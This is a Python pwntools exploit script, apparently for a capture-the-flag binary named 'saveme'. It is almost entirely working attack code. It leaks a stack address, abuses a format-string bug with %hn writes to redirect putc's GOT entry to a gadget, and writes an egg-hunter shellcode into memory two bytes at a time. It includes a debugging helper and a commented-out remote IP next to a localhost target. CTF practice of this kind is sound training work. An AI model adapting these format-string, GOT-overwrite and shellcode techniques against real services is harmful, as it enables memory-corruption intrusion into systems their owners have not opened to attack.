#!/usr/bin/python3

import subprocess
from pwn import *

exe = ELF('./saveme', checksec=False)
exe.sym['main'] = 0x401419
context.log_level = 'debug'
context.binary = exe

def checkwhitechar(payload):
	print(payload)
	assert(b'\x08' not in payload)
	assert(b'\x09' not in payload)
	assert(b'\x0a' not in payload)
	assert(b'\x0b' not in payload)
	assert(b'\x0c' not in payload)
	assert(b'\x0d' not in payload)
	assert(b'\x20' not in payload)
	return payload

def GDB():
    command = '''
    b*0x405022
    b*0x401522
    c
    '''
    '''
    b*0x405039
    '''
    with open('/tmp/command.gdb', 'wt') as f:
        f.write(command)
    # subprocess.Popen(['/usr/bin/x-terminal-emulator', '--geometry', '960x1080+0+0', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
    subprocess.Popen(['/usr/bin/x-terminal-emulator', '--geometry', '960x1080+960+0', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
    input()         # input() to make program wait with gdb

# p = process('./saveme')
# p = connect('20.124.204.46', 9991)
p = connect('127.0.0.1', 9991)

p.recvuntil(b'your gift: ')
stack_leak = int(p.recv(14), 16)
saved_rbp = stack_leak + 0x60
log.info("Stack leak: " + hex(stack_leak))
log.info("Saved rbp: " + hex(saved_rbp))

########################################
### Stage 1: Change putc@got to pop6 ###
########################################
p.sendlineafter(b'option: ', b'2')
payload = f'%{0x4015b2 & 0xffff}c%10$hn'.encode()
payload = payload.ljust(0x10, b'P')
payload += flat(
	exe.got['putc'],		# <-- %10$hn
	0x401531,
	saved_rbp + 0x60,
	0,
	0,
	0,
	0,
	0x4014e8
	)
p.sendlineafter(b'person: ', checkwhitechar(payload))

###########################
### Stage 2: Egg hunter ###
###########################
shellcode = asm('''
init:
	xor rdi, rdi
	push 0x406000
	pop rsi
	mov dl, 0xff
run:
	add rsi, 0x1000
	xor rax, rax
	syscall
	cmp al, 0xf2
	je run
	add rsi, 0x2a0
	inc rdi
	mov al, 1
	syscall
	''', os='linux', arch='amd64')
checkwhitechar(shellcode)

# Send 3 bytes will trigger printf call malloc
# --> Bad syscall
for i in range(0, len(shellcode), 2):
	print(shellcode[i:i+2])
	if len(shellcode[i:i+2])==1:
		payload = f'%{u8(shellcode[i:i+2])}c%10$hn'.encode()
		if u8(shellcode[i:i+2])==0:
			payload = payload[3:]
	else:
		payload = f'%{u16(shellcode[i:i+2])}c%10$hn'.encode()
		if u16(shellcode[i:i+2])==0:
			payload = payload[3:]
	payload = payload.ljust(0x10, b'P')
	payload += flat(
		0x00000000405024+i,		# <-- %10$p
		0x401531,
		saved_rbp + 0x60*(int(i/2)+2),
		0,
		0,
		0,
		0,
		0x4014e8	
		)
	p.sendlineafter(b'person: ', checkwhitechar(payload))

print(shellcode)
payload = f'%{0x405024 & 0xffff}c%10$hn'.encode()
payload = payload.ljust(0x10, b'P')
payload += flat(
	exe.got['putc'],		# <-- %10$hn
	0x401531,
	saved_rbp + 0x60,
	0,
	0,
	0,
	0,
	0x4014e8	
	)
p.sendlineafter(b'person: ', checkwhitechar(payload))

p.interactive()